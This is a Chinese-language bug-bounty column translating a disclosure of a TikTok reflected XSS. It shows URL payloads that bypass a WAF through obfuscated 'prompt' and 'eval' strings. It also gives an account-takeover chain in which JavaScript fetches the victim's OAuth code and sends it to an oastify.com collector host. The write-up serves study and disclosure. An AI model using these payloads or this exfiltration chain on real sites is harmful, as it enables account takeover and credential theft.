## 海外SRC赏金挖掘专栏

> **在学习SRC，漏洞挖掘，外网打点，渗透测试，攻防打点等的过程中，我很喜欢看一些国外的漏洞报告，总能通过国外的赏金大牛，黑客分享中学习到很多东西，有的是一些新的信息收集方式，又或者是一些骚思路,骚姿势，又或者是苛刻环境的漏洞利用。于是我打算开启这个专栏，将我认为优秀的文章进行翻译，加入我的理解和笔记，方便我自己学习和各位师傅共同进步，我争取做到日更，如果各位师傅觉得有用的话，可以给我点个关注~~ 如果师傅们有什么好的建议也欢迎联系我~~ 感谢各位师傅的支持~~**

## 正文部分

原文作者：https://medium.com/@mrhavit

不得不说为什么国外这么重视xss，是因为国外的赏金猎人在进行xss挖掘的时候并不只停留在验证阶段（弹窗），更多的是一种拓展性的利用！！

### 漏洞总结

1.首先在tiktok的重定向页面发现存在没有进行预编码处理，导致xss
2.利用特定的poc进行waf的绕过
3.在httponly存在的条件下，直接获取用户的凭据，而是利用了OAuth的验证模式，进行进一步的利用，最后实现接管

### 资产范围

https://tiktok.com/

### **漏洞复现**

使用中国的VPN代理，尝试访问 https://tiktok.com/ 时，立即被重定向到另一个网页，上面显示“此页面在您所在的地区不可用”

> 例如GPT不给国内使用一样，会进行跳转当前地区不可以使用！

![Image](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiccgSXwUxY6g7V1GpqptoVRL1AT208E5CudAn3CbxznATib9PtCxPiba16gxvoCdnzudG4kCC2WuG6KQ/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=1 "null")

#### 通过参数发现url跳转  

`https://www.tiktok.com/status?status=7&link=https://go.onelink.me/bIdt/[2]`

新的重定向 URL 包含一些参数。第一个参数是 “status”，它负责页面内容。第二个参数是 “link”，我们仍然不知道它如何影响页面。

当我们将 “status” 参数的值更改为 “1” 时，页面的内容发生了变化，并出现了一个新按钮。单击该按钮会将您重定向到 “link” 参数的值。这就是 “link” 参数发挥作用的地方。

例如：`https://www.tiktok.com/status?status=1&link=https://go.onelink.me/BAuo/[3]`  

![Image](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiccgSXwUxY6g7V1GpqptoVRLSJsoQxc4QQpIiaC5NgC97WQKQDP34cg999QBsndsmqwCMHiatBICV6jg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=2 "null")

  

#### 尝试进行xss注入

我们通过插入一些常见的 XSS 有效负载（例如“javascript：alert（）”和“javascript://”）来开始测试“link”参数值，但没有任何变化。重定向链接仍设置为 “https://go.onelink.me/BAuo/”。过了一会儿，我意识到我们其实可以控制这条路。这意味着我们将 “link” 参数值设置为 “https://go.onelink.me/mrhavit/”，它实际上被嵌入到 HTML 中。

![Image](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiccgSXwUxY6g7V1GpqptoVRLqhdttvQH8cZfsrL3Id6hSrFEELplWgQ2fibriaKw0Ys1rfKcKvp7rhCA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=3 "null")

`https://www.tiktok.com/status?status=1&link=https://go.onelink.me/mrhavit/[4]` 下一步是检查我们是否卡在 “href” 属性中，或者是否可以突破并设置一些事件。正如您可能已经猜到的那样，转义设置不正确，我们能够成功地将新事件插入到 “href” 属性中。

![Image](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiccgSXwUxY6g7V1GpqptoVRL7uWgQFibOvic8ic46HnP1vwrePMLozoXXVAZqxXkBK63PN78kT0HSGGFg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=4 "null")

`https://www.tiktok.com/status?status=1&link=https://go.onelink.me/mrhavit/%22%20test[5]` 
这时，我们意识到 XSS 有很好的线索，并开始深入挖掘。

#### waf绕过

尝试进行onclick弹窗验证，发现存在waf！

```
https://www.tiktok.com/status?status=1&link=https://go.onelink.me/mrhavit/%22%20onclick=alert(1)
```

![Image](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiccgSXwUxY6g7V1GpqptoVRLGIPOibtLw7l8n2KXEtK7dd7R0y1XwJc9jVxsdtNRztSSVfmafu5OzOw/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=5 "null")

由于这是一个非常特殊的情况，并且是一个独特的注入入口点，因此我们在这里没有找到可以在线找到并绕过 WAF 的 XSS 有效负载的快速获胜。因此，我们开始学习如何处理这个 WAF，并试图通过制作一个独特的有效负载来绕过它。绕过 WAF 并非易事。像 “>” 和 “<” 这样的特殊字符被正确地转义/编码，因此通过使用一些编码技巧，成功地插入了 “onclick” 事件。在花了一些时间工作和利用我们的 JavaScript 技能之后，我们终于找到了一个很酷的旁路，让我们能够成功执行 JavaScript！

![Image](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiccgSXwUxY6g7V1GpqptoVRLtyk6TDxkvQIKwMrQlj8dGgMNEzb7TXrQKzT5Y88bp4QibaSeRAqgRSg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=6 "null")

> `https://www.tiktok.com/status?status=1&link=https://go.onelink.me/dsa+%0A%0D%0A%0D%22%3C!%3E!%0D%0Atarget=%22_blank%22%0D%0Aonclick=%0D%0A%22%0D%0Ax=window[%27pr%27%2b%27o%27%2b%27m%27+%2b%27pt%27](%271%27)（%271%27）%0D%0Aompt，%0D%0Ax'Tiktok'`

#### poc分析

**poc 解码后如下**

```
https://go.onelink.me/dsa\ "<!>!target="_blank"onclick="x=window['pr'+'o'+'m'+'pt']('1')('1')ompt,x'Tiktok'
```

> **我在本地尝试进行复现，需要源码的可以关注私信我！**

1. 首先利用" 进行闭合
    

![Image](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiccgSXwUxY6g7V1GpqptoVRLzmTSRYA8EW2rwsGNpgJ33TSuFfoedGu6spAlmxyJeluBmReiaAjfFsQ/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=7 "null")

2. target="blank" 因为这里是a标签，使用target="blank"，是为了让onclick函数可以正常执行，不然会直接跳转
    

![Image](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiccgSXwUxY6g7V1GpqptoVRLCmleLDJdheamfV5BS5aW7skcc1ZxkXiauiceyepTchhKiau3ibSEOPvYng/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=8 "null")

3. window'pr'+'o'+'m'+'pt'[7]等效于window.prompt('1')，类似的思路还有top等！
    

![Image](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiccgSXwUxY6g7V1GpqptoVRL230qZTXdRlGGqV93cffRNbFOuvMvzWNocKyJFzemAoUeav7NiaP4TQg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=9 "null")

![Image](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiccgSXwUxY6g7V1GpqptoVRLprFMZ7wEr9nSsqTPEovJerek4QXr1ibwDjUUZyOibdpzziahe7JZ7FXrA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=10 "null")

4. 利用x变量作为中间，然后进行传参，再实现弹窗
5. 同时利用了一些特性，比如在html标签中，很多符号可以对空格进行替代，回车等等

#### 危害提升（利用oauth实现接管）

> **这里比较巧妙的一点就是，常规的HTTPOnly原理就是防止用户直接使用js代码进行cookie的获取，但是不会防止正常的前后端请求，同时cookie是有域的，当你正常请求一个站点的时候，他任然会把cookie携带过去，也就是你在进行oauth的时候，他是带上了你的凭据的，从而实现httponly的绕过接管**

帐户接管始终是展示 XSS 漏洞影响的一个很好的例子。虽然由于 HTTPOnly 标志，现在窃取 cookie 很少见，但对目标有足够的了解可以以创造性的方式导致帐户接管。我们通过使用“TikTok OAuth”来实现这一目标。大多数 TikTok 服务都提供“使用 TikTok 登录”作为其登录过程的选项。在本文中，我们将重点介绍“ads.tiktok.com”，但此漏洞也会影响其他服务，例如卖家、商店等。

![Image](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiccgSXwUxY6g7V1GpqptoVRLe52XrVvribHGic3QX0TEpqoMb2fibqqgP2aaAXVRyib6oicnp5pBk53JQpw/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=11 "null")

`https://ads.tiktok.com/i18n/login/?source=ads_homepage&lang=en&region=0[8]`点击“使用TikTok 登录”后，显示以下页面：

![Image](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiccgSXwUxY6g7V1GpqptoVRLbFduRzEFdH4LqFyrkhrWibMUeQKM19bZn5oKKq4O8233rDWAdI9R6mg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=12 "null")

`https://www.tiktok.com/auth/authorize?client_key=aw8cb3204x0a1g88&response_type=code&scope=user.info.basic%2Cuser.info.email%2Cuser.info.phone%2Cuser.info.showcase%2Cvideo.list.no_watermark%2Cvideo.list.private_ads.no_watermark%2Cuser.account.configure%2Cvideo.list.manage%2Clive.list%2Ccomment.list%2Ccomment.list.manage&version=1&lang=en&state=b5d324d197693fd0ab0f5bde42020d3f91feb5bb&redirect_uri=https%3A%2F%2Fads.tiktok.com%2Fi18n%2Flogin%2F%3F_extra%3DcGxhdGZvcm09dGlrdG9rJmxvZ2luX2FjdGlvbj1yZWRpcmVjdCZzaG93X2JpbmRfZXJyb3I9dHJ1ZSZzaG93X2xvZ291dD10cnVlJm9yaWdpbj1odHRwczovL2Fkcy50aWt0b2suY29tL2kxOG4vbG9naW4vJnVzZXJfc2V0dGluZ19zdGF0dXM9dHJ1ZSZyZWRpcmVjdD1odHRwcyUzQSUyRiUyRmFkcy50aWt0b2suY29tJTJGaTE4biUyRmhvbWUlMkYmZnJvbV9wYWdlPWxvZ2lu%26state%3Db5d324d197693fd0ab0f5bde42020d3f91feb5bb&error_uri=https%3A%2F%2Fads.tiktok.com%2Fi18n%2Flogin%2F%3F_extra%3DcGxhdGZvcm09dGlrdG9rJmxvZ2luX2FjdGlvbj1yZWRpcmVjdCZzaG93X2JpbmRfZXJyb3I9dHJ1ZSZzaG93X2xvZ291dD10cnVlJm9yaWdpbj1odHRwczovL2Fkcy50aWt0b2suY29tL2kxOG4vbG9naW4vJnVzZXJfc2V0dGluZ19zdGF0dXM9dHJ1ZSZyZWRpcmVjdD1odHRwcyUzQSUyRiUyRmFkcy50aWt0b2suY29tJTJGaTE4biUyRmhvbWUlMkYmZnJvbV9wYWdlPWxvZ2lu%26state%3Db5d324d197693fd0ab0f5bde42020d3f91feb5bb[9]`

此页面托管在`“www.tiktok.com[10]”`上，该主机是存在 XSS 漏洞的同一主机。单击“授权”按钮后，生成了以下请求：

```
POST /passport/open/web/auth/?client_key=aw8cb3204x0a1g88&scope=user.info.basic%2Cuser.info.phone%2Cuser.account.configure%2Ccomment.list.manage%2Cuser.info.showcase%2Clive.list%2Ccomment.list%2Cvideo.list.private_ads.no_watermark%2Cvideo.list.manage%2Cuser.info.email%2Cvideo.list.no_watermark&aid=1459&source=web&redirect_uri=https%3A%2F%2Fads.tiktok.com%2Fi18n%2Flogin%2F%3F_extra%3DcGxhdGZvcm09dGlrdG9rJmxvZ2luX2FjdGlvbj1yZWRpcmVjdCZzaG93X2JpbmRfZXJyb3I9dHJ1ZSZzaG93X2xvZ291dD10cnVlJm9yaWdpbj1odHRwczovL2Fkcy50aWt0b2suY29tL2kxOG4vbG9naW4vJnVzZXJfc2V0dGluZ19zdGF0dXM9dHJ1ZSZyZWRpcmVjdD1odHRwcyUzQSUyRiUyRmFkcy50aWt0b2suY29tJTJGaTE4biUyRmhvbWUlMkYmZnJvbV9wYWdlPWxvZ2lu%26state%3Db5d324d197693fd0ab0f5bde42020d3f91feb5bb&state=b5d324d197693fd0ab0f5bde42020d3f91feb5bb HTTP/2Host: www.tiktok.comCookie:.............Content-Length:2Sec-Ch-Ua:"Google Chrome";v="113","Chromium";v="113","Not-A.Brand";v="24"Accept: application/json, text/plain,*/*Content-Type: application/jsonUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36Origin: https://www.tiktok.comSec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: https://www.tiktok.com/auth/authorize?client_key=aw8cb3204x0a1g88&response_type=code&scope=user.info.basic%2Cuser.info.email%2Cuser.info.phone%2Cuser.info.showcase%2Cvideo.list.no_watermark%2Cvideo.list.private_ads.no_watermark%2Cuser.account.configure%2Cvideo.list.manage%2Clive.list%2Ccomment.list%2Ccomment.list.manage&version=1&lang=en&state=b5d324d197693fd0ab0f5bde42020d3f91feb5bb&redirect_uri=https%3A%2F%2Fads.tiktok.com%2Fi18n%2Flogin%2F%3F_extra%3DcGxhdGZvcm09dGlrdG9rJmxvZ2luX2FjdGlvbj1yZWRpcmVjdCZzaG93X2JpbmRfZXJyb3I9dHJ1ZSZzaG93X2xvZ291dD10cnVlJm9yaWdpbj1odHRwczovL2Fkcy50aWt0b2suY29tL2kxOG4vbG9naW4vJnVzZXJfc2V0dGluZ19zdGF0dXM9dHJ1ZSZyZWRpcmVjdD1odHRwcyUzQSUyRiUyRmFkcy50aWt0b2suY29tJTJGaTE4biUyRmhvbWUlMkYmZnJvbV9wYWdlPWxvZ2lu%26state%3Db5d324d197693fd0ab0f5bde42020d3f91feb5bb&error_uri=https%3A%2F%2Fads.tiktok.com%2Fi18n%2Flogin%2F%3F_extra%3DcGxhdGZvcm09dGlrdG9rJmxvZ2luX2FjdGlvbj1yZWRpcmVjdCZzaG93X2JpbmRfZXJyb3I9dHJ1ZSZzaG93X2xvZ291dD10cnVlJm9yaWdpbj1odHRwczovL2Fkcy50aWt0b2suY29tL2kxOG4vbG9naW4vJnVzZXJfc2V0dGluZ19zdGF0dXM9dHJ1ZSZyZWRpcmVjdD1odHRwcyUzQSUyRiUyRmFkcy50aWt0b2suY29tJTJGaTE4biUyRmhvbWUlMkYmZnJvbV9wYWdlPWxvZ2lu%26state%3Db5d324d197693fd0ab0f5bde42020d3f91feb5bbAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9{}
```

响应包含一些非常有趣的内容 — OAuth 身份验证的 “代码”。

![Image](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBiccgSXwUxY6g7V1GpqptoVRLu5vZEQHgcpXIEic1HySE13HEPqAmDHrlvQY4ZspyIyCqX7mSC5nGl4g/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=13 "null")

如果我们将此漏洞与我们的 XSS 漏洞相结合，则只需单击一下就有可能泄露受害者的 OAuth“代码”。虽然 TikTok 在修复此漏洞之前没有看到任何证据表明该漏洞被利用，但获得这些代码的攻击者可以使用它们来接管受害者的帐户。

#### 完整利用链

> **这里能够进行危害提升的方式主要有两个：**
> 
> 1. 第一点：存在xss的网站和统一授权的网站是同一个，因为是同一个所以可以像下面一样去构造js，在js中去请求ouath去实现接管，但是如果不是同一个网站，也就存在Cors跨域的，就无法构造js去获取到返回值，也就无法获取到认证，本质上上CSRF和Cors漏洞的核心区别。
> 2. 第二点是aouth每个用户进行授权的时候的url都一样，如果有些特别字段无法构造的话，他的危害也是有限的！
>     

我们创建了一个绕过 WAF 的 JS 负载，并从攻击者的服务器加载了一个新脚本。在我们的示例中，脚本是从 “http://127.0.0.1:5500/asd.js” 加载的。“asd.js”文件包含 JavaScript 代码，该代码将 XHR POST 请求发送到“OAuth”端点，并将响应发送到攻击者控制的服务器。

```
var xhr =newXMLHttpRequest();xhr.onload = reqListener;xhr.open("POST","https://www.tiktok.com/passport/open/web/auth/?client_key=aw8cb3204x0a1g88&scope=user.info.basic%2Cuser.info.phone%2Cvideo.list.manage%2Ccomment.list%2Clive.list%2Cvideo.list.private_ads.no_watermark%2Cuser.account.configure%2Cuser.info.showcase%2Cuser.info.email%2Cvideo.list.no_watermark%2Ccomment.list.manage&aid=1459&source=web&redirect_uri=https%3a%2f%2fads.tiktok.com%2fblablablabla&state=64588d019065e001fa8e7abdd884581c10770400");xhr.withCredentials =true;xhr.setRequestHeader("Content-Type","application/json");xhr.send();function reqListener(){    location='//rqlu5n70d1zgnxxbz3xzlq09b0hr5ntc.oastify.com/log?key='+this.responseText;};
```

响应包含受害者用户的 OAuth“代码”，攻击者可能使用该代码来访问受害者的帐户。在以下视频中，我们演示了受害者如何单击 XSS，并将 OAuth“代码”发送回攻击者的受控服务器。

```
https://www.tiktok.com/status?status=1&link=https://go.onelink.me/dsa+%0A%0D%0A%0D%22%3C！！%3E！（英文） %0D%0Atarget=%22_blank%22%0D%0Aonclick=%0D%0A%22%0D%0Ax=window[%27ev%27%2b%27a%27%2b%27l%27]（（%27fe%27+%2b+%27tch%27+%2b+%27（%27+%2b+%27%27ht%27+%2b+%27tp%27+%2b+%27%3a//%27+%2b+%27lo%27+%2b+%27ca%27+%2b+%27lho%27+%2b+%27st%27+%2b+%27%3a%27+%2b+%2755%27+%2b+%2700%27+%2b+%27/%27+%2b+%27as%27+%2b+%27d.%27+%2b+%27js%27%27+%2b+%27）%27+%2b+%27.%27+%2b+%27the%27+%2b+%27n（%27+%2b+%27re%27+%2b+%27sp%27+%2b+%27on%27+%2b+%27se%27+%2b+%27%3d%3E%27+%2b+%27re%27+%2b+%27sp%27+%2b+%27on%27+%2b+%27se.%27+%2b+%27te%27+%2b+%27xt(）%27+%2b+%27.%27+%2b+%27the%27+%2b+%27n（%27+%2b+%27te%27+%2b+%27xt%27+%2b+%27%3d%3E%27+%2b+%27ev%27+%2b+%27al%27+%2b+%27（%27+%2b+%27te%27+%2b+%27xt%27+%2b+%27）%27+%2b+%27）%27+%2b+%27）%27））[11]
```

